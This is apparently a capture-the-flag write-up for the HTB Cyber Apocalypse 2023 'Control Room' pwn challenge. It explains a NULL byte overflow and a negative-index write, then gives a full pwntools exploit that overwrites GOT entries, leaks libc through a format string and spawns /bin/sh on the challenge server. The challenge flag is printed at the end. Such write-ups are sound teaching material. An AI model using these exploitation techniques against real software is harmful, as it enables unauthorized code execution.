# Control Room - HTB Cyber Apocalypse 2023

## Description
After unearthing the crashed alien spacecraft you have hacked your way into it's interior. Nothing seems perticularily interesting until you find the spacecraft's control room. Filled with monitors, buttons and panels this room surely contains a lot of important information, including the coordinates of the underground alien vessels that you 've been looking for. You decide to start off by booting up the main computer. You hear an uncanny buzzing-like noise and then a monitor lights up requesting you to enter a username. Can you take control of the Control Room?

## Solution
There are 2 bugs in this program.

An off-by-one NULL byte overflow inside of edit_user, which allows us to overwrite the user's role with a NULL byte to become Captain.
An OOB write in the configure_engine function, which allows us to write into indexes that are in the negative.

Checksec:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

I tried to figure out how to leak with the Captain. As he had the latitude longitude way of writing characters out. In the end I was only able to cause a stack leak with this, so I gave up and decided to take another approach which only really used the technician. The full exploit process was as follows:

1. Use NULL byte overflow to change ourselves to Captain in the beginning
2. Change role to technician
3. Overwrite exit GOT with user_register so we can use this as an arb write but without NULL bytes
4. Overwrite the curr_user pointer to point at the end of control_panel instead.
5. This changes us back to Captain so we change our role back to technician again
6. Overwrite puts' GOT so it becomes printf instead.
7. Make the program "exit" which calls user_register instead. This lets us write into the control_panel string. We write in a bunch of %p's, which causes a leak, since puts is now printf instead.
8. Receive leak
9. Overwrite strlen's GOT with system
10. Make the program call "exit" again which will call user_register. Write in /bin/sh. This will cause strlen which is actually system to be triggered with /bin/sh as input.


Exploit:

```py
from pwn import *

io = remote("165.232.100.84",31246)

#Become Captain
username = b'A'*0x100

io.recvuntil(b'Enter a username:')

io.send(username)

io.recvuntil(b'>')

io.sendline(b'n')

io.recvuntil(b'New username size:')

io.sendline(b'256')

io.recvuntil(b'Enter your new username:')
io.send(b'A'*0xff)

io.recvuntil(b'Option [1-5]:')

#Change role to technician
io.sendline(b'5')
io.recvuntil(b'New role:')
io.sendline(b'1')


#overwrite exit with user_register to get an arb write without NULL bytes
user_register = 0x0040170c
io.recvuntil(b'Option [1-5]:')
io.sendline(b'1')
io.recvuntil(b'Engine number [0-3]:')
io.sendline(b'-7')
io.recvuntil(b'Thrust:')
io.sendline(f"{user_register}".encode())
io.recvuntil(b'Mixture ratio:')
io.sendline(b'0')
io.recvuntil(b'(y/n)')
io.sendline(b'y')

#overwrite curr_user pointer to point at control_panel
io.recvuntil(b'Option [1-5]:')
io.sendline(b'1')
io.recvuntil(b'Engine number [0-3]:')
io.sendline(b'-2')
io.recvuntil(b'Thrust:')
io.sendline(f"{0x4053b8}".encode())
io.recvuntil(b'Mixture ratio:')
io.sendline(b'0')
io.recvuntil(b'(y/n)')
io.sendline(b'y')

#Change role to technician
io.sendline(b'5')
io.recvuntil(b'New role:')
io.sendline(b'1')


#overwrite puts to become printf
strncpy_orig_got = 0x401040
printf_plt = 0x004011e0
io.recvuntil(b'Option [1-5]:')
io.sendline(b'1')
io.recvuntil(b'Engine number [0-3]:')
io.sendline(b'-16')
io.recvuntil(b'Thrust:')
io.sendline(f"{strncpy_orig_got}".encode())
io.recvuntil(b'Mixture ratio:')
io.sendline(f"{printf_plt}".encode())
io.recvuntil(b'(y/n)')
io.sendline(b'y')

#overwrite the control panel with fmt string shit
io.recvuntil(b'Option [1-5]:')
io.sendline(b'6')
io.recvuntil(b'Enter a username:')
io.sendline(b'&'+b'%p_'*83+b'&')
io.recvuntil(b'&')
leak = int(io.recvuntil(b'&').split(b'_')[2],16)
libc_base = leak - 0x114a37

log.info(f"libc leak: {libc_base:#x}")

system = libc_base+0x00050d60

#overwrite strlen with system
stack_chk_orig_got = 0x401090
io.recvuntil(b'Option [1-5]:')
io.sendline(b'1')
io.recvuntil(b'Engine number [0-3]:')
io.sendline(b'-14')
io.recvuntil(b'Thrust:')
io.sendline(f"{system}".encode())
io.recvuntil(b'Mixture ratio:')
io.sendline(f"{stack_chk_orig_got}".encode())
io.recvuntil(b'(y/n)')
io.sendline(b'y')


#Send /bin/sh\x00 so that we call /bin/sh with strlen
io.recvuntil(b'Option [1-5]:')
io.sendline(b'6')

io.recvuntil(b'Enter a username:')
io.sendline(b'/bin/sh\x00')

io.interactive()
```

## Flag
`HTB{pr3p4r3_4_1mp4ct~~!}`
